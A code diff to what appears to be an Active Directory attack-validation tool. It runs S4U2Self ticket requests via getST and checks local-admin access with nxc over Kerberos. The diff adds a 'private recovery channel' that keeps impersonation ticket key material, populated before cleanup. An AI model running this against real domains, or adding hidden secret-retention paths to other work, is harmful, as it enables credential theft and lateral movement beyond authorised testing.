@@ -23,7 +23,8 @@ from typing import Any
 
 from .. import netresolve, proof, states
 from ..recommend import ParamSpec, ParamValue, values, recommended_spn
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, redact_argv,
+from ._reveal_common import key_material
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, redact_argv,
                    Capability, CAP_CCACHE)
 from . import _s4u_common as s4u
 
@@ -83,7 +84,18 @@ class S4U2SelfExecutor(ValidationExecutor):
             f"nxc smb {v['self_host']} -k --use-kcache   (Pwn3d = LOCAL ADMIN)",
         ]
 
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_result(*args):
+            artifact.update(self._result(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         acct, impersonate = v["computer_account"], v["impersonate"]
@@ -102,12 +114,13 @@ class S4U2SelfExecutor(ValidationExecutor):
         res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                              env={"KRB5CCNAME": None}, cwd=str(out_dir))
         ticket = s4u.parse_ticket(res.stdout or "", out_dir)
+        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, ticket))
         if ticket is None:
             reason = s4u.classify_kerberos_failure((res.stdout or "") + "\n" + (res.stderr or "")) \
                 or "getST_no_ticket"
             rec("getST_self", getst_argv, res, False, note=reason)
             errors.append(reason)
-            return self._result(steps, errors, None, False, acct, impersonate, self_host, reason, cfg)
+            return finish_result(steps, errors, None, False, acct, impersonate, self_host, reason, cfg)
         rec("getST_self", getst_argv, res, True, note="self ticket saved")
 
         nxc_argv = ["nxc", "smb", self_host, "-k", "--use-kcache",
@@ -129,7 +142,7 @@ class S4U2SelfExecutor(ValidationExecutor):
                     errors.append(diag)
                 errors.append("nxc_access_failed")
         classification = "local_admin" if pwned else ("authenticated_not_admin" if authed else "no_access")
-        art = self._result(steps, errors, ticket, pwned, acct, impersonate, self_host, classification, cfg)
+        art = finish_result(steps, errors, ticket, pwned, acct, impersonate, self_host, classification, cfg)
         if pwned:
             art["_composed_products"] = {"ccache": ticket, "principal": impersonate, "host": self_host}
         return art
